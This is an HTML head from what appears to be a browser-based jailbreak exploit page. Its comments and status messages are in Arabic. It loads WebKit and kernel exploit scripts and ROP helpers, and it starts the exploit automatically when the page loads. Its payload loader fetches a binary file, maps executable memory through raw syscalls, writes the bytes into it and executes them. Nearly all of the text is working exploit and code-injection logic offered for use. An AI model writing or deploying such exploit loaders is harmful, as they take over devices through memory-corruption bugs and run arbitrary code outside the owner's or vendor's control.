<head>
    <script src="int64.js"></script>
    <script src="rop.js"></script>
    <script src="webkit.js"></script>
    <script src="exploit.js"></script>
    <script src="kexploit.js"></script>

    <script>
        // دالة تحديث حالة الثغرة
        function s(msg) {
            document.getElementById('helper').innerText = msg;
        }

        // محرك شحن البايلودات المدمج
        function loadPayload(payloadPath) {
            s("جاري قراءة الملف: " + payloadPath);
            var xhr = new XMLHttpRequest();
            xhr.open('GET', payloadPath, true);
            xhr.responseType = 'arraybuffer';
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var data = new Uint8Array(xhr.response);
                    s("جاري الحقن في الذاكرة... يرجى الانتظار");
                    try {
                        // استخدام دوال النظام من الملفات المرفقة
                        var pb = chain.syscall(477, 0, data.length, 7, 0x1000, -1, 0);
                        for (var i = 0; i < data.length; i++) { write8(pb.add32(i), data[i]); }
                        var ta = malloc(8);
                        chain.syscall(79, pb, 0, ta);
                        s("تم التشغيل بنجاح! ✅");
                    } catch (e) {
                        s("خطأ: تأكد من ظهور رسالة Awaiting Payload أولاً");
                    }
                } else {
                    s("خطأ: الملف غير موجود في مجلد payloads");
                }
            };
            xhr.send();
        }

        // تشغيل الثغرة تلقائياً عند الدخول
        window.onload = function() {
            s("جاري تشغيل محرك الثغرة... يرجى الانتظار");
            setTimeout(poc, 1500); 
        };
    </script>
</head>
